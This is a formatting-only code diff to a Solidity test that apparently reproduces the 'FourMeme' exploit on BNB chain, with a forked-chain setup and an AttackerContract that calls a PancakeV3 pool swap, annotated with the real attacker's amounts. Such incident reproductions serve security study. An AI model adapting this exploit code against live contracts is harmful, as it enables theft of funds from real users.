@@ -29,7 +29,7 @@ contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
 
     function setUp() external {
         // We pin one block before the exploit process began
-        cheat.createSelectFork(vm.envString("RPC_URL"), 46555724);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 46_555_724);
 
         // The attacker started with some BNBs
         cheat.deal(address(this), attackerAddress.balance);
@@ -153,18 +153,19 @@ contract VictimMock {
 contract AttackerContract is IPancakeV3SwapCallback {
     address snowWBNBPoolAddress;
 
-    function swapTokens(IPancakeV3Factory pancakeFactory, address t0, address t1) external /* onlyOwner */ {
+    function swapTokens(IPancakeV3Factory pancakeFactory, address t0, address t1) external /* onlyOwner */  {
         snowWBNBPoolAddress = pancakeFactory.getPool(t0, t1, 10_000);
 
-        IPancakeV3Pool(snowWBNBPoolAddress).swap(
-            address(this),
-            true,
-            330_000,
-            // Attacker used 1_603_243_002_223_000_000_000 (entire balance held in an account)
-            4_295_128_740,
-            // Attacker used 4_295_128_740_000_000 as price limit
-            ""
-        );
+        IPancakeV3Pool(snowWBNBPoolAddress)
+            .swap(
+                address(this),
+                true,
+                330_000,
+                // Attacker used 1_603_243_002_223_000_000_000 (entire balance held in an account)
+                4_295_128_740,
+                // Attacker used 4_295_128_740_000_000 as price limit
+                ""
+            );
     }
 
     function pancakeV3SwapCallback(int256 amount0Delta, int256 _amount1Delta, bytes calldata _data)
